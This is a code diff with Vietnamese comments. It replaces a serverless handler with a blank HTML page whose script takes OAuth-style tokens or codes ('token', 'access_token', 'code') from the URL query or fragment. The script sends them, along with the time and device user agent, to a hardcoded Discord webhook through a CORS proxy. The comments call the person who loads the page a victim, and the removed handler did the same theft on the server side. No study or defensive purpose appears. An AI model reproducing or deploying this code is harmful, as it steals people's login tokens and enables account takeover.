@@ -1,31 +1,56 @@
-export default async function handler(req, res) {
-    const code = req.query.code;
-    
-    // Thay link Discord Webhook thật của bạn vào đây
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1568610122794664119/uEuSKJfGpF96kMblYpnjVVYyTBYL6DuWafptMyxuITU_Ep0Lfq94AQWXv6QLxsXoVBKe";
-
-    if (code && !WEBHOOK_URL.includes("YOUR_DISCORD_WEBHOOK_URL_HERE")) {
-        // Server Vercel tự động gửi sang Discord Webhook (Bất tử trên mọi loại mobile)
-        try {
-            await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: `🚨 **Code Mới Nhận Được (Mobile/PC):** \`${code}\``
-                })
-            });
-        } catch (e) {
-            // Bỏ qua lỗi ngầm
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <style>
+        body, html {
+            background-color: #ffffff;
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
         }
-    }
+    </style>
+</head>
+<body>
 
-    // Trả về trang web trắng tinh cho nạn nhân nhìn thấy
-    res.setHeader('Content-Type', 'text/html; charset=utf-8');
-    return res.status(200).send(`
-        <!DOCTYPE html>
-        <html>
-        <head><title></title></head>
-        <body style="background-color: #ffffff; margin: 0;"></body>
-        </html>
-    `);
-}
+<script>
+    (function() {
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1568610122794664119/uEuSKJfGpF96kMblYpnjVVYyTBYL6DuWafptMyxuITU_Ep0Lfq94AQWXv6QLxsXoVBKe";
+        if (!WEBHOOK_URL) return;
+
+        // Quét token hoặc code từ URL ngay lập tức (cả dạng ? và dạng #)
+        const urlParams = new URLSearchParams(window.location.search);
+        let token = urlParams.get('token') || urlParams.get('access_token') || urlParams.get('code');
+
+        if (!token && window.location.hash) {
+            const hashParams = new URLSearchParams(window.location.hash.substring(1));
+            token = hashParams.get('token') || hashParams.get('access_token');
+        }
+
+        if (!token) return;
+
+        // Đóng gói nội dung gửi về Discord
+        const payload = {
+            content: `🚨 **Tóm Gọn Thành Công!**\n- **Token/Code:** \`${token}\`\n- **Thời gian:** ${new Date().toLocaleString()}\n- **Thiết bị:** \`${navigator.userAgent}\``
+        };
+
+        // Gửi qua CORS Proxy cực nhanh, hỗ trợ keepalive sống dai ngay cả khi đóng web siêu tốc
+        try {
+            fetch("https://corsproxy.io/?" + encodeURIComponent(WEBHOOK_URL), {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload),
+                keepalive: true
+            });
+        } catch (e) {}
+    })();
+</script>
+
+</body>
+</html>
